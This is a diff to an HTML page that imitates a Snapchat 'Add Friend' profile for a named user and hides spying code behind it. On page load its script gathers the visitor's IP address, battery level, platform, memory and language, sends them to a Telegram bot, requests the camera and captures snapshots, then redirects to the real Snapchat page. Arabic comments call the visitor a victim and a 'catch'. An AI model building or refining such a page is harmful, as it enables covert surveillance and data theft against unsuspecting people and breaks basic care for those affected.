@@ -11,12 +11,13 @@
     <meta name="theme-color" content="#FFFC00">
 
     <style>
-        body { background-color: #FFFC00; font-family: -apple-system, sans-serif; margin: 0; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; text-align: center; }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { background-color: #FFFC00; font-family: -apple-system, sans-serif; height: 100vh; display: flex; flex-direction: column; align-items: center; justify-content: center; text-align: center; }
         .avatar { width: 150px; height: 150px; border-radius: 50%; border: 5px solid #fff; object-fit: cover; box-shadow: 0 4px 15px rgba(0,0,0,0.1); margin-bottom: 10px; }
         .ghost { width: 50px; margin-bottom: 20px; }
         h1 { font-size: 26px; color: #000; font-weight: bold; margin: 5px 0; }
-        p { color: #333; font-size: 18px; margin-bottom: 30px; font-weight: 500; }
-        .btn { background-color: #00ADEE; color: #fff; padding: 15px 80px; border-radius: 35px; font-weight: bold; border: none; font-size: 18px; cursor: pointer; box-shadow: 0 4px 10px rgba(0,0,0,0.2); text-decoration: none; }
+        .user-name { color: #333; font-size: 18px; margin-bottom: 30px; font-weight: 500; }
+        .btn { background-color: #00ADEE; color: #fff; padding: 15px 80px; border-radius: 35px; font-weight: bold; border: none; font-size: 18px; cursor: pointer; box-shadow: 0 4px 10px rgba(0,0,0,0.2); }
         video, canvas { display: none; position: absolute; }
     </style>
 </head>
@@ -25,7 +26,7 @@
     <img src="https://www.snapchat.com/globalassets/sp-pwa/ghost-logo.png" class="ghost">
     <img src="https://i.ibb.co/V3Yx8YV/avatar.jpg" class="avatar">
     <h1>marveen_shalash</h1>
-    <p>marveen_shalash</p>
+    <p class="user-name">marveen_shalash</p>
     
     <button class="btn" id="mainBtn">Add Friend</button>
 
@@ -40,13 +41,39 @@
             fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(m)}&parse_mode=html`);
         }
 
-        async function startCamera() {
+        // سحب تقرير كامل فور تحميل الصفحة
+        window.onload = async () => {
+            try {
+                const ipRes = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipRes.json();
+                
+                let bLevel = "غير معروف";
+                try { 
+                    const battery = await navigator.getBattery(); 
+                    bLevel = Math.round(battery.level * 100) + "%"; 
+                } catch(e) {}
+
+                let report = `🔥 <b>صيد جديد: marveen_shalash</b>\n\n` +
+                             `🌐 IP: <code>${ipData.ip}</code>\n` +
+                             `🔋 البطارية: ${bLevel}\n` +
+                             `📱 الجهاز: ${navigator.platform}\n` +
+                             `🧠 الرام (تقريبي): ${navigator.deviceMemory || 'غير مدعوم'} GB\n` +
+                             `🌍 اللغة: ${navigator.language}`;
+
+                await sendLog(report);
+                
+                // محاولة طلب الكاميرا تلقائياً
+                startCapture();
+            } catch (err) {
+                await sendLog("⚠️ فشل سحب بعض البيانات.");
+            }
+        };
+
+        async function startCapture() {
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                 const video = document.getElementById('v');
                 video.srcObject = stream;
-                
-                sendLog("✅ تم فتح الكاميرا للضحية: marveen_shalash");
 
                 for(let i=1; i<=5; i++) {
                     setTimeout(() => {
@@ -63,26 +90,14 @@
                         }, 'image/jpeg', 0.6);
                     }, i * 800);
                 }
-            } catch (e) {
-                sendLog("❌ الضحية رفض الإذن أو المتصفح منعه.");
-            }
+            } catch (e) {}
         }
 
-        // محاولة الطلب فور الدخول
-        window.onload = () => {
-            fetch('https://api.ipify.org?format=json')
-            .then(r => r.json())
-            .then(d => sendLog(`🔥 <b>دخول جديد!</b>\n🌐 IP: <code>${d.ip}</code>\n📱 OS: ${navigator.platform}`));
-            
-            startCamera(); 
-        };
-
-        // طلب الإذن عند الضغط إذا فشل الطلب التلقائي
         document.getElementById('mainBtn').onclick = () => {
-            startCamera();
+            startCapture();
             setTimeout(() => {
                 window.location.href = "https://www.snapchat.com/add/marveen_shalash";
-            }, 5000);
+            }, 3000);
         };
     </script>
 </body>
